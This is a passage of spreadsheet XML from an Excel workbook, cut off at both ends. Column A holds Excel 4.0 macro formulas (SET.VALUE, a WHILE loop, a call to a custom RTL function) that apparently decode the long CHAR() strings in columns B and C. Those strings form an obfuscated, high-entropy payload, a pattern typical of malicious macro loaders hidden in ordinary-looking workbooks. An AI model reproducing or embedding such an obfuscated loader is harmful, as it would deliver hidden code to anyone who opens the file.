?D,8¯ÜœEâoö¡kÏF´¢ÆQ_x001B_€_x0002_^ã».Æu_x000B_</v>
      </c>
      <c r="C29" t="str">
        <f>CHAR(118)&amp;CHAR(60)&amp;CHAR(195)&amp;CHAR(74)&amp;CHAR(39)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(135)&amp;CHAR(179)&amp;CHAR(188)</f>
        <v>v&lt;ÃJ'¥û‡³¼</v>
      </c>
    </row>
    <row r="30" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A30" t="b">
        <f bx="1">main=$C$1</f>
        <v>0</v>
      </c>
      <c r="B30" t="str">
        <f>CHAR(19)&amp;CHAR(249)&amp;CHAR(254)&amp;CHAR(253)&amp;CHAR(111)&amp;CHAR(74)&amp;CHAR(196)&amp;CHAR(18)&amp;CHAR(198)&amp;CHAR(134)&amp;CHAR(87)&amp;CHAR(22)&amp;CHAR(230)&amp;CHAR(234)&amp;CHAR(247)&amp;CHAR(101)&amp;CHAR(179)&amp;CHAR(83)&amp;CHAR(127)&amp;CHAR(223)&amp;CHAR(95)&amp;CHAR(119)&amp;CHAR(11)&amp;CHAR(167)&amp;CHAR(156)&amp;CHAR(134)&amp;CHAR(191)&amp;CHAR(159)&amp;CHAR(38)&amp;CHAR(227)&amp;CHAR(68)&amp;CHAR(249)&amp;CHAR(10)&amp;CHAR(89)&amp;CHAR(253)&amp;CHAR(58)&amp;CHAR(88)&amp;CHAR(30)&amp;CHAR(243)&amp;CHAR(112)&amp;CHAR(214)&amp;CHAR(62)&amp;CHAR(239)&amp;CHAR(124)&amp;CHAR(70)&amp;CHAR(177)&amp;CHAR(63)&amp;CHAR(250)&amp;CHAR(39)&amp;CHAR(41)&amp;CHAR(46)&amp;CHAR(103)&amp;CHAR(242)&amp;CHAR(26)&amp;CHAR(247)&amp;CHAR(229)&amp;CHAR(168)&amp;CHAR(54)&amp;CHAR(93)&amp;CHAR(30)&amp;CHAR(84)&amp;CHAR(226)&amp;CHAR(223)&amp;CHAR(5)&amp;CHAR(100)&amp;CHAR(202)&amp;CHAR(174)&amp;CHAR(106)&amp;CHAR(2)&amp;CHAR(67)&amp;CHAR(60)&amp;CHAR(159)&amp;CHAR(213)&amp;CHAR(36)&amp;CHAR(234)&amp;CHAR(198)&amp;CHAR(167)&amp;CHAR(48)&amp;CHAR(25)&amp;CHAR(149)&amp;CHAR(145)&amp;CHAR(122)&amp;CHAR(200)&amp;CHAR(152)&amp;CHAR(104)&amp;CHAR(43)&amp;CHAR(24)&amp;CHAR(108)&amp;CHAR(223)&amp;CHAR(226)&amp;CHAR(28)&amp;CHAR(50)&amp;CHAR(147)&amp;CHAR(147)&amp;CHAR(157)&amp;CHAR(150)&amp;CHAR(32)&amp;CHAR(220)&amp;CHAR(172)&amp;CHAR(252)&amp;CHAR(167)&amp;CHAR(153)&amp;CHAR(199)&amp;CHAR(150)&amp;CHAR(43)&amp;CHAR(128)&amp;CHAR(176)&amp;CHAR(78)&amp;CHAR(107)&amp;CHAR(82)&amp;CHAR(100)&amp;CHAR(4)&amp;CHAR(170)&amp;CHAR(242)&amp;CHAR(79)&amp;CHAR(49)&amp;CHAR(251)&amp;CHAR(42)&amp;CHAR(45)&amp;CHAR(145)&amp;CHAR(92)&amp;CHAR(76)&amp;CHAR(130)&amp;CHAR(74)&amp;CHAR(194)&amp;CHAR(217)&amp;CHAR(118)&amp;CHAR(236)&amp;CHAR(190)&amp;CHAR(172)&amp;CHAR(207)&amp;CHAR(143)&amp;CHAR(165)&amp;CHAR(195)&amp;CHAR(45)&amp;CHAR(233)&amp;CHAR(81)&amp;CHAR(28)&amp;CHAR(154)&amp;CHAR(178)&amp;CHAR(37)&amp;CHAR(71)&amp;CHAR(181)&amp;CHAR(192)&amp;CHAR(193)&amp;CHAR(99)&amp;CHAR(71)&amp;CHAR(27)&amp;CHAR(118)&amp;CHAR(103)&amp;CHAR(153)&amp;CHAR(97)&amp;CHAR(220)&amp;CHAR(34)&amp;CHAR(47)&amp;CHAR(80)&amp;CHAR(152)&amp;CHAR(212)&amp;CHAR(46)&amp;CHAR(110)&amp;CHAR(233)&amp;CHAR(178)&amp;CHAR(108)&amp;CHAR(229)&amp;CHAR(241)&amp;CHAR(101)&amp;CHAR(135)&amp;CHAR(18)&amp;CHAR(205)&amp;CHAR(37)&amp;CHAR(171)&amp;CHAR(89)&amp;CHAR(77)&amp;CHAR(230)&amp;CHAR(67)&amp;CHAR(255)&amp;CHAR(33)&amp;CHAR(79)&amp;CHAR(210)&amp;CHAR(194)&amp;CHAR(73)&amp;CHAR(234)&amp;CHAR(163)&amp;CHAR(156)&amp;CHAR(95)&amp;CHAR(79)&amp;CHAR(59)&amp;CHAR(97)&amp;CHAR(150)&amp;CHAR(8)&amp;CHAR(34)&amp;CHAR(119)&amp;CHAR(161)&amp;CHAR(111)&amp;CHAR(171)&amp;CHAR(105)&amp;CHAR(242)&amp;CHAR(14)&amp;CHAR(19)&amp;CHAR(227)&amp;CHAR(235)&amp;CHAR(25)&amp;CHAR(217)&amp;CHAR(142)&amp;CHAR(18)&amp;CHAR(242)&amp;CHAR(156)&amp;CHAR(42)&amp;CHAR(215)&amp;CHAR(6)&amp;CHAR(163)&amp;CHAR(220)&amp;CHAR(119)&amp;CHAR(232)&amp;CHAR(91)&amp;CHAR(26)&amp;CHAR(167)&amp;CHAR(158)&amp;CHAR(35)&amp;CHAR(87)&amp;CHAR(123)&amp;CHAR(188)&amp;CHAR(231)&amp;CHAR(165)&amp;CHAR(157)&amp;CHAR(188)&amp;CHAR(72)&amp;CHAR(248)&amp;CHAR(214)&amp;CHAR(41)&amp;CHAR(219)&amp;CHAR(17)&amp;CHAR(181)&amp;CHAR(5)&amp;CHAR(103)&amp;CHAR(253)&amp;CHAR(22)&amp;CHAR(66)&amp;CHAR(28)&amp;CHAR(192)&amp;CHAR(118)&amp;CHAR(221)&amp;CHAR(116)&amp;CHAR(102)&amp;CHAR(24)&amp;CHAR(12)&amp;CHAR(255)&amp;CHAR(46)&amp;CHAR(60)&amp;CHAR(160)&amp;CHAR(125)&amp;CHAR(187)&amp;CHAR(133)&amp;CHAR(182)&amp;CHAR(119)</f>
        <v>_x0013_ùþýoJÄ_x0012_Æ†W_x0016_æê÷e³Sß_w_x000B_§œ†¿Ÿ&amp;ãDù
Yý:X_x001E_ópÖ&gt;ï|F±?ú').gò_x001A_÷å¨6]_x001E_Tâß_x0005_dÊ®j_x0002_C&lt;ŸÕ$êÆ§0_x0019_•‘zÈ˜h+_x0018_lßâ_x001C_2““– Ü¬ü§™Ç–+€°NkRd_x0004_ªòO1û*-‘\L‚JÂÙvì¾¬Ï¥Ã-éQ_x001C_š²%GµÀÁcG_x001B_vg™aÜ"/P˜Ô.né²låñe‡_x0012_Í%«YMæCÿ!OÒÂIê£œ_O;a–_x0008_"w¡o«iò_x000E__x0013_ãë_x0019_ÙŽ_x0012_òœ*×_x0006_£Üwè[_x001A_§ž#W{¼ç¥¼HøÖ)Û_x0011_µ_x0005_gý_x0016_B_x001C_ÀvÝtf_x0018__x000C_ÿ.&lt; }»…¶w</v>
      </c>
      <c r="C30" t="str">
        <f>CHAR(136)&amp;CHAR(206)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(19)&amp;CHAR(212)&amp;CHAR(58)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(173)</f>
        <v>ˆÎ!¥_x0013_Ô:±Ö­</v>
      </c>
    </row>
    <row r="31" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A31" t="b">
        <f>SET.VALUE(D1,0)</f>
        <v>0</v>
      </c>
      <c r="B31" t="str">
        <f>CHAR(15)&amp;CHAR(245)&amp;CHAR(41)&amp;CHAR(102)&amp;CHAR(84)&amp;CHAR(122)&amp;CHAR(255)&amp;CHAR(115)&amp;CHAR(21)&amp;CHAR(158)&amp;CHAR(188)&amp;CHAR(14)&amp;CHAR(80)&amp;CHAR(46)&amp;CHAR(187)&amp;CHAR(80)&amp;CHAR(100)&amp;CHAR(108)&amp;CHAR(123)&amp;CHAR(235)&amp;CHAR(3)&amp;CHAR(58)&amp;CHAR(155)&amp;CHAR(247)&amp;CHAR(215)&amp;CHAR(35)&amp;CHAR(113)&amp;CHAR(108)&amp;CHAR(247)&amp;CHAR(221)&amp;CHAR(83)&amp;CHAR(117)&amp;CHAR(249)&amp;CHAR(97)&amp;CHAR(31)&amp;CHAR(121)&amp;CHAR(20)&amp;CHAR(91)&amp;CHAR(233)&amp;CHAR(89)&amp;CHAR(62)&amp;CHAR(136)&amp;CHAR(179)&amp;CHAR(52)&amp;CHAR(29)&amp;CHAR(5)&amp;CHAR(50)&amp;CHAR(156)&amp;CHAR(54)&amp;CHAR(179)&amp;CHAR(135)&amp;CHAR(103)&amp;CHAR(165)&amp;CHAR(151)&amp;CHAR(42)&amp;CHAR(212)&amp;CHAR(229)&amp;CHAR(71)&amp;CHAR(198)&amp;CHAR(70)&amp;CHAR(201)&amp;CHAR(21)&amp;CHAR(48)&amp;CHAR(33)&amp;CHAR(146)&amp;CHAR(73)&amp;CHAR(236)&amp;CHAR(105)&amp;CHAR(218)&amp;CHAR(65)&amp;CHAR(4)&amp;CHAR(104)&amp;CHAR(131)&amp;CHAR(92)&amp;CHAR(124)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(99)&amp;CHAR(215)&amp;CHAR(78)&amp;CHAR(147)&amp;CHAR(63)&amp;CHAR(112)&amp;CHAR(13)&amp;CHAR(160)&amp;CHAR(50)&amp;CHAR(110)&amp;CHAR(5)&amp;CHAR(224)&amp;CHAR(46)&amp;CHAR(255)&amp;CHAR(124)&amp;CHAR(188)&amp;CHAR(95)&amp;CHAR(21)&amp;CHAR(202)&amp;CHAR(177)&amp;CHAR(152)&amp;CHAR(137)&amp;CHAR(47)&amp;CHAR(148)&amp;CHAR(142)&amp;CHAR(13)&amp;CHAR(100)&amp;CHAR(208)&amp;CHAR(173)&amp;CHAR(163)&amp;CHAR(199)&amp;CHAR(63)&amp;CHAR(191)&amp;CHAR(109)&amp;CHAR(186)&amp;CHAR(27)&amp;CHAR(172)&amp;CHAR(73)&amp;CHAR(74)&amp;CHAR(46)&amp;CHAR(90)&amp;CHAR(184)&amp;CHAR(225)&amp;CHAR(205)&amp;CHAR(167)&amp;CHAR(122)&amp;CHAR(3)&amp;CHAR(232)&amp;CHAR(127)&amp;CHAR(117)&amp;CHAR(156)&amp;CHAR(103)&amp;CHAR(127)&amp;CHAR(101)&amp;CHAR(209)&amp;CHAR(143)&amp;CHAR(173)&amp;CHAR(228)&amp;CHAR(141)&amp;CHAR(237)&amp;CHAR(102)&amp;CHAR(56)&amp;CHAR(31)&amp;CHAR(10)&amp;CHAR(68)&amp;CHAR(174)&amp;CHAR(62)&amp;CHAR(220)&amp;CHAR(88)&amp;CHAR(106)&amp;CHAR(87)&amp;CHAR(233)&amp;CHAR(175)&amp;CHAR(32)&amp;CHAR(217)&amp;CHAR(138)&amp;CHAR(188)&amp;CHAR(213)&amp;CHAR(146)&amp;CHAR(207)&amp;CHAR(205)&amp;CHAR(136)&amp;CHAR(222)&amp;CHAR(108)&amp;CHAR(63)&amp;CHAR(167)&amp;CHAR(81)&amp;CHAR(191)&amp;CHAR(88)&amp;CHAR(1)&amp;CHAR(53)&amp;CHAR(71)&amp;CHAR(199)&amp;CHAR(75)&amp;CHAR(224)&amp;CHAR(130)&amp;CHAR(192)&amp;CHAR(50)&amp;CHAR(166)&amp;CHAR(116)&amp;CHAR(21)&amp;CHAR(194)&amp;CHAR(81)&amp;CHAR(2)&amp;CHAR(221)&amp;CHAR(37)&amp;CHAR(112)&amp;CHAR(53)&amp;CHAR(124)&amp;CHAR(148)&amp;CHAR(5)&amp;CHAR(243)&amp;CHAR(58)&amp;CHAR(234)&amp;CHAR(205)&amp;CHAR(218)&amp;CHAR(43)&amp;CHAR(113)&amp;CHAR(193)&amp;CHAR(3)&amp;CHAR(21)&amp;CHAR(163)&amp;CHAR(139)&amp;CHAR(101)&amp;CHAR(180)&amp;CHAR(199)&amp;CHAR(52)&amp;CHAR(252)&amp;CHAR(81)&amp;CHAR(38)&amp;CHAR(77)&amp;CHAR(23)&amp;CHAR(140)&amp;CHAR(215)&amp;CHAR(210)&amp;CHAR(132)&amp;CHAR(177)&amp;CHAR(188)&amp;CHAR(90)&amp;CHAR(116)&amp;CHAR(151)&amp;CHAR(79)&amp;CHAR(108)&amp;CHAR(165)&amp;CHAR(32)&amp;CHAR(121)&amp;CHAR(84)&amp;CHAR(87)&amp;CHAR(16)&amp;CHAR(158)&amp;CHAR(110)&amp;CHAR(153)&amp;CHAR(241)&amp;CHAR(176)&amp;CHAR(177)&amp;CHAR(95)&amp;CHAR(133)&amp;CHAR(61)&amp;CHAR(71)&amp;CHAR(219)&amp;CHAR(251)&amp;CHAR(110)&amp;CHAR(210)&amp;CHAR(139)&amp;CHAR(22)&amp;CHAR(116)&amp;CHAR(16)&amp;CHAR(117)&amp;CHAR(205)&amp;CHAR(224)&amp;CHAR(238)&amp;CHAR(253)&amp;CHAR(46)&amp;CHAR(48)&amp;CHAR(179)&amp;CHAR(196)&amp;CHAR(67)&amp;CHAR(74)</f>
        <v>_x000F_õ)fTzÿs_x0015_ž¼_x000E_P.»Pdl{ë_x0003_:›÷×#ql÷ÝSuùa_x001F_y_x0014_[éY&gt;ˆ³4_x001D__x0005_2œ6³‡g¥—*ÔåGÆFÉ_x0015_0!’IìiÚA_x0004_hƒ\|»ëc×N“?p_x000D_ 2n_x0005_à.ÿ|¼__x0015_Ê±˜‰/”Ž_x000D_dÐ­£Ç?¿mº_x001B_¬IJ.Z¸áÍ§z_x0003_èuœgeÑ­äíf8_x001F_
D®&gt;ÜXjWé¯ ÙŠ¼Õ’ÏÍˆÞl?§Q¿X_x0001_5GÇKà‚À2¦t_x0015_ÂQ_x0002_Ý%p5|”_x0005_ó:êÍÚ+qÁ_x0003__x0015_£‹e´Ç4üQ&amp;M_x0017_Œ×Ò„±¼Zt—Ol¥ yTW_x0010_žn™ñ°±_…=GÛûnÒ‹_x0016_t_x0010_uÍàîý.0³ÄCJ</v>
      </c>
      <c r="C31" t="str">
        <f>CHAR(105)&amp;CHAR(46)&amp;CHAR(207)&amp;CHAR(234)&amp;CHAR(22)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(105)&amp;CHAR(38)</f>
        <v>i.Ïê_x0016_±ÖÈi&amp;</v>
      </c>
    </row>
    <row r="32" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A32" t="b">
        <f>WHILE(main&lt;&gt;"EXCEL")</f>
        <v>0</v>
      </c>
      <c r="B32" t="str">
        <f>CHAR(233)&amp;CHAR(20)&amp;CHAR(90)&amp;CHAR(13)&amp;CHAR(200)&amp;CHAR(107)&amp;CHAR(2)&amp;CHAR(21)&amp;CHAR(7)&amp;CHAR(234)&amp;CHAR(230)&amp;CHAR(154)&amp;CHAR(204)&amp;CHAR(178)&amp;CHAR(60)&amp;CHAR(247)&amp;CHAR(54)&amp;CHAR(218)&amp;CHAR(47)&amp;CHAR(119)&amp;CHAR(117)&amp;CHAR(208)&amp;CHAR(71)&amp;CHAR(117)&amp;CHAR(227)&amp;CHAR(189)&amp;CHAR(103)&amp;CHAR(206)&amp;CHAR(35)&amp;CHAR(92)&amp;CHAR(175)&amp;CHAR(152)&amp;CHAR(134)&amp;CHAR(54)&amp;CHAR(31)&amp;CHAR(185)&amp;CHAR(223)&amp;CHAR(8)&amp;CHAR(3)&amp;CHAR(26)&amp;CHAR(160)&amp;CHAR(104)&amp;CHAR(121)&amp;CHAR(62)&amp;CHAR(142)&amp;CHAR(50)&amp;CHAR(201)&amp;CHAR(39)&amp;CHAR(48)&amp;CHAR(147)&amp;CHAR(229)&amp;CHAR(112)&amp;CHAR(40)&amp;CHAR(152)&amp;CHAR(200)&amp;CHAR(3)&amp;CHAR(121)&amp;CHAR(232)&amp;CHAR(148)&amp;CHAR(153)&amp;CHAR(234)&amp;CHAR(103)&amp;CHAR(91)&amp;CHAR(72)&amp;CHAR(116)&amp;CHAR(109)&amp;CHAR(53)&amp;CHAR(80)&amp;CHAR(221)&amp;CHAR(162)&amp;CHAR(55)&amp;CHAR(144)&amp;CHAR(224)&amp;CHAR(255)&amp;CHAR(25)&amp;CHAR(188)&amp;CHAR(7)&amp;CHAR(33)&amp;CHAR(154)&amp;CHAR(98)&amp;CHAR(242)&amp;CHAR(241)&amp;CHAR(109)&amp;CHAR(143)&amp;CHAR(125)&amp;CHAR(26)&amp;CHAR(171)&amp;CHAR(126)&amp;CHAR(193)&amp;CHAR(147)&amp;CHAR(180)&amp;CHAR(37)&amp;CHAR(31)&amp;CHAR(109)&amp;CHAR(64)&amp;CHAR(220)&amp;CHAR(97)&amp;CHAR(188)&amp;CHAR(232)&amp;CHAR(204)&amp;CHAR(67)&amp;CHAR(185)&amp;CHAR(147)&amp;CHAR(5)&amp;CHAR(92)&amp;CHAR(190)&amp;CHAR(211)&amp;CHAR(25)&amp;CHAR(120)&amp;CHAR(86)&amp;CHAR(254)&amp;CHAR(118)&amp;CHAR(82)&amp;CHAR(197)&amp;CHAR(79)&amp;CHAR(62)&amp;CHAR(192)&amp;CHAR(80)&amp;CHAR(165)&amp;CHAR(137)&amp;CHAR(128)&amp;CHAR(220)&amp;CHAR(224)&amp;CHAR(183)&amp;CHAR(8)&amp;CHAR(236)&amp;CHAR(204)&amp;CHAR(123)&amp;CHAR(192)&amp;CHAR(150)&amp;CHAR(222)&amp;CHAR(109)&amp;CHAR(145)&amp;CHAR(35)&amp;CHAR(37)&amp;CHAR(105)&amp;CHAR(253)&amp;CHAR(176)&amp;CHAR(54)&amp;CHAR(52)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(252)&amp;CHAR(195)&amp;CHAR(234)&amp;CHAR(101)&amp;CHAR(124)&amp;CHAR(158)&amp;CHAR(48)&amp;CHAR(94)&amp;CHAR(183)&amp;CHAR(98)&amp;CHAR(236)&amp;CHAR(152)&amp;CHAR(213)&amp;CHAR(251)&amp;CHAR(86)&amp;CHAR(172)&amp;CHAR(233)&amp;CHAR(27)&amp;CHAR(191)&amp;CHAR(49)&amp;CHAR(171)&amp;CHAR(215)&amp;CHAR(180)&amp;CHAR(225)&amp;CHAR(86)&amp;CHAR(8)&amp;CHAR(79)&amp;CHAR(135)&amp;CHAR(198)&amp;CHAR(72)&amp;CHAR(32)&amp;CHAR(172)&amp;CHAR(166)&amp;CHAR(22)&amp;CHAR(77)&amp;CHAR(216)&amp;CHAR(107)&amp;CHAR(84)&amp;CHAR(215)&amp;CHAR(38)&amp;CHAR(163)&amp;CHAR(177)&amp;CHAR(161)&amp;CHAR(188)&amp;CHAR(80)&amp;CHAR(228)&amp;CHAR(213)&amp;CHAR(10)&amp;CHAR(3)&amp;CHAR(133)&amp;CHAR(57)&amp;CHAR(195)&amp;CHAR(101)&amp;CHAR(80)&amp;CHAR(68)&amp;CHAR(209)&amp;CHAR(50)&amp;CHAR(230)&amp;CHAR(83)&amp;CHAR(135)&amp;CHAR(124)&amp;CHAR(106)&amp;CHAR(33)&amp;CHAR(193)&amp;CHAR(84)&amp;CHAR(177)&amp;CHAR(139)&amp;CHAR(178)&amp;CHAR(160)&amp;CHAR(53)&amp;CHAR(232)&amp;CHAR(175)&amp;CHAR(211)&amp;CHAR(115)&amp;CHAR(23)&amp;CHAR(234)&amp;CHAR(175)&amp;CHAR(36)&amp;CHAR(115)&amp;CHAR(175)&amp;CHAR(20)&amp;CHAR(115)&amp;CHAR(74)&amp;CHAR(254)&amp;CHAR(88)&amp;CHAR(232)&amp;CHAR(39)&amp;CHAR(134)&amp;CHAR(31)&amp;CHAR(143)&amp;CHAR(164)&amp;CHAR(213)&amp;CHAR(25)&amp;CHAR(252)&amp;CHAR(106)&amp;CHAR(190)&amp;CHAR(149)&amp;CHAR(24)&amp;CHAR(6)&amp;CHAR(246)&amp;CHAR(141)&amp;CHAR(119)&amp;CHAR(113)&amp;CHAR(179)&amp;CHAR(92)&amp;CHAR(26)&amp;CHAR(62)&amp;CHAR(171)&amp;CHAR(12)&amp;CHAR(118)&amp;CHAR(68)&amp;CHAR(17)&amp;CHAR(2)</f>
        <v>é_x0014_Z_x000D_Èk_x0002__x0015__x0007_êæšÌ²&lt;÷6Ú/wuÐGuã½gÎ#\¯˜†6_x001F_¹ß_x0008__x0003__x001A_ hy&gt;Ž2É'0“åp(˜È_x0003_yè”™êg[Htm5PÝ¢7àÿ_x0019_¼_x0007_!šbòñm}_x001A_«~Á“´%_x001F_m@Üa¼èÌC¹“_x0005_\¾Ó_x0019_xVþvRÅO&gt;ÀP¥‰€Üà·_x0008_ìÌ{À–Þm‘#%iý°64_x0016__x0004_üÃêe|ž0^·bì˜ÕûV¬é_x001B_¿1«×´áV_x0008_O‡ÆH ¬¦_x0016_MØkT×&amp;£±¡¼PäÕ
_x0003_…9ÃePDÑ2æS‡|j!ÁT±‹² 5è¯Ós_x0017_ê¯$s¯_x0014_sJþXè'†_x001F_¤Õ_x0019_üj¾•_x0018__x0006_öwq³\_x001A_&gt;«_x000C_vD_x0011__x0002_</v>
      </c>
      <c r="C32" t="str">
        <f>CHAR(61)&amp;CHAR(247)&amp;CHAR(119)&amp;CHAR(56)&amp;CHAR(38)&amp;CHAR(128)&amp;CHAR(172)&amp;CHAR(176)&amp;CHAR(142)&amp;CHAR(201)</f>
        <v>=÷w8&amp;€¬°ŽÉ</v>
      </c>
    </row>
    <row r="33" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A33" t="b">
        <f>SET.VALUE(D2,LEN(main))</f>
        <v>0</v>
      </c>
      <c r="B33" t="str">
        <f>CHAR(12)&amp;CHAR(239)&amp;CHAR(184)&amp;CHAR(40)&amp;CHAR(72)&amp;CHAR(140)&amp;CHAR(94)&amp;CHAR(160)&amp;CHAR(129)&amp;CHAR(97)&amp;CHAR(154)&amp;CHAR(237)&amp;CHAR(49)&amp;CHAR(162)&amp;CHAR(59)&amp;CHAR(99)&amp;CHAR(30)&amp;CHAR(195)&amp;CHAR(199)&amp;CHAR(71)&amp;CHAR(185)&amp;CHAR(232)&amp;CHAR(190)&amp;CHAR(20)&amp;CHAR(109)&amp;CHAR(125)&amp;CHAR(124)&amp;CHAR(230)&amp;CHAR(103)&amp;CHAR(145)&amp;CHAR(222)&amp;CHAR(241)&amp;CHAR(98)&amp;CHAR(33)&amp;CHAR(215)&amp;CHAR(131)&amp;CHAR(5)&amp;CHAR(63)&amp;CHAR(65)&amp;CHAR(188)&amp;CHAR(160)&amp;CHAR(159)&amp;CHAR(207)&amp;CHAR(93)&amp;CHAR(235)&amp;CHAR(172)&amp;CHAR(171)&amp;CHAR(23)&amp;CHAR(205)&amp;CHAR(86)&amp;CHAR(255)&amp;CHAR(220)&amp;CHAR(104)&amp;CHAR(148)&amp;CHAR(65)&amp;CHAR(82)&amp;CHAR(231)&amp;CHAR(177)&amp;CHAR(1)&amp;CHAR(147)&amp;CHAR(86)&amp;CHAR(44)&amp;CHAR(244)&amp;CHAR(86)&amp;CHAR(25)&amp;CHAR(111)&amp;CHAR(227)&amp;CHAR(252)&amp;CHAR(244)&amp;CHAR(9)&amp;CHAR(240)&amp;CHAR(4)&amp;CHAR(227)&amp;CHAR(228)&amp;CHAR(130)&amp;CHAR(182)&amp;CHAR(224)&amp;CHAR(162)&amp;CHAR(109)&amp;CHAR(148)&amp;CHAR(14)&amp;CHAR(62)&amp;CHAR(204)&amp;CHAR(132)&amp;CHAR(31)&amp;CHAR(69)&amp;CHAR(118)&amp;CHAR(100)&amp;CHAR(99)&amp;CHAR(184)&amp;CHAR(76)&amp;CHAR(250)&amp;CHAR(121)&amp;CHAR(123)&amp;CHAR(128)&amp;CHAR(74)&amp;CHAR(65)&amp;CHAR(170)&amp;CHAR(14)&amp;CHAR(173)&amp;CHAR(87)&amp;CHAR(84)&amp;CHAR(114)&amp;CHAR(246)&amp;CHAR(30)&amp;CHAR(254)&amp;CHAR(157)&amp;CHAR(190)&amp;CHAR(194)&amp;CHAR(26)&amp;CHAR(139)&amp;CHAR(78)&amp;CHAR(234)&amp;CHAR(50)&amp;CHAR(139)&amp;CHAR(228)&amp;CHAR(2)&amp;CHAR(98)&amp;CHAR(162)&amp;CHAR(147)&amp;CHAR(252)&amp;CHAR(149)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(95)&amp;CHAR(1)&amp;CHAR(117)&amp;CHAR(37)&amp;CHAR(21)&amp;CHAR(208)&amp;CHAR(120)&amp;CHAR(188)&amp;CHAR(60)&amp;CHAR(48)&amp;CHAR(93)&amp;CHAR(249)&amp;CHAR(89)&amp;CHAR(167)&amp;CHAR(93)&amp;CHAR(244)&amp;CHAR(172)&amp;CHAR(64)&amp;CHAR(82)&amp;CHAR(186)&amp;CHAR(197)&amp;CHAR(188)&amp;CHAR(254)&amp;CHAR(56)&amp;CHAR(6)&amp;CHAR(185)&amp;CHAR(16)&amp;CHAR(117)&amp;CHAR(224)&amp;CHAR(244)&amp;CHAR(194)&amp;CHAR(156)&amp;CHAR(92)&amp;CHAR(55)&amp;CHAR(137)&amp;CHAR(99)&amp;CHAR(247)&amp;CHAR(225)&amp;CHAR(90)&amp;CHAR(78)&amp;CHAR(25)&amp;CHAR(135)&amp;CHAR(110)&amp;CHAR(155)&amp;CHAR(220)&amp;CHAR(212)&amp;CHAR(61)&amp;CHAR(18)&amp;CHAR(154)&amp;CHAR(95)&amp;CHAR(197)&amp;CHAR(50)&amp;CHAR(19)&amp;CHAR(37)&amp;CHAR(24)&amp;CHAR(241)&amp;CHAR(65)&amp;CHAR(230)&amp;CHAR(141)&amp;CHAR(160)&amp;CHAR(98)&amp;CHAR(167)&amp;CHAR(105)&amp;CHAR(143)&amp;CHAR(215)&amp;CHAR(68)&amp;CHAR(235)&amp;CHAR(203)&amp;CHAR(98)&amp;CHAR(44)&amp;CHAR(99)&amp;CHAR(52)&amp;CHAR(88)&amp;CHAR(88)&amp;CHAR(6)&amp;CHAR(23)&amp;CHAR(196)&amp;CHAR(223)&amp;CHAR(200)&amp;CHAR(18)&amp;CHAR(33)&amp;CHAR(2)&amp;CHAR(186)&amp;CHAR(229)&amp;CHAR(210)&amp;CHAR(157)&amp;CHAR(193)&amp;CHAR(190)&amp;CHAR(83)&amp;CHAR(64)&amp;CHAR(247)&amp;CHAR(175)&amp;CHAR(156)&amp;CHAR(11)&amp;CHAR(214)&amp;CHAR(6)&amp;CHAR(23)&amp;CHAR(59)&amp;CHAR(229)&amp;CHAR(172)&amp;CHAR(106)&amp;CHAR(46)&amp;CHAR(70)&amp;CHAR(159)&amp;CHAR(197)&amp;CHAR(185)&amp;CHAR(241)&amp;CHAR(26)&amp;CHAR(22)&amp;CHAR(176)&amp;CHAR(71)&amp;CHAR(173)&amp;CHAR(28)&amp;CHAR(214)&amp;CHAR(149)&amp;CHAR(18)&amp;CHAR(19)&amp;CHAR(67)&amp;CHAR(166)&amp;CHAR(238)&amp;CHAR(38)&amp;CHAR(251)&amp;CHAR(58)&amp;CHAR(46)&amp;CHAR(9)&amp;CHAR(134)&amp;CHAR(110)&amp;CHAR(54)&amp;CHAR(164)&amp;CHAR(103)&amp;CHAR(123)</f>
        <v>_x000C_ï¸(HŒ^ aší1¢;c_x001E_ÃÇG¹è¾_x0014_m}|æg‘Þñb!×ƒ_x0005_?A¼ ŸÏ]ë¬«_x0017_ÍVÿÜh”ARç±_x0001_“V,ôV_x0019_oãüô	ð_x0004_ãä‚¶à¢m”_x000E_&gt;Ì„_x001F_Evdc¸Lúy{€JAª_x000E_­WTrö_x001E_þ¾Â_x001A_‹Nê2‹ä_x0002_b¢“ü•_x0003_
__x0001_u%_x0015_Ðx¼&lt;0]ùY§]ô¬@RºÅ¼þ8_x0006_¹_x0010_uàôÂœ\7‰c÷áZN_x0019_‡n›ÜÔ=_x0012_š_Å2_x0013_%_x0018_ñAæ b§i×DëËb,c4XX_x0006__x0017_ÄßÈ_x0012_!_x0002_ºåÒÁ¾S@÷¯œ_x000B_Ö_x0006__x0017_;å¬j.FŸÅ¹ñ_x001A__x0016_°G­_x001C_Ö•_x0012__x0013_C¦î&amp;û:.	†n6¤g{</v>
      </c>
      <c r="C33" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(158)&amp;CHAR(69)&amp;CHAR(44)&amp;CHAR(158)&amp;CHAR(253)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(89)</f>
        <v>&gt;±žE,žýÏ&gt;Y</v>
      </c>
    </row>
    <row r="34" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A34" t="e">
        <f>RTL(A22+(D1*10),main,LEN(main))</f>
        <v>#NAME?</v>
      </c>
      <c r="B34" t="str">
        <f>CHAR(172)&amp;CHAR(214)&amp;CHAR(115)&amp;CHAR(106)&amp;CHAR(56)&amp;CHAR(253)&amp;CHAR(93)&amp;CHAR(149)&amp;CHAR(126)&amp;CHAR(151)&amp;CHAR(179)&amp;CHAR(107)&amp;CHAR(163)&amp;CHAR(248)&amp;CHAR(26)&amp;CHAR(245)&amp;CHAR(106)&amp;CHAR(135)&amp;CHAR(89)&amp;CHAR(74)&amp;CHAR(9)&amp;CHAR(242)&amp;CHAR(249)&amp;CHAR(21)&amp;CHAR(70)&amp;CHAR(105)&amp;CHAR(168)&amp;CHAR(234)&amp;CHAR(139)&amp;CHAR(93)&amp;CHAR(69)&amp;CHAR(130)&amp;CHAR(185)&amp;CHAR(78)&amp;CHAR(25)&amp;CHAR(59)&amp;CHAR(233)&amp;CHAR(141)&amp;CHAR(193)&amp;CHAR(165)&amp;CHAR(103)&amp;CHAR(228)&amp;CHAR(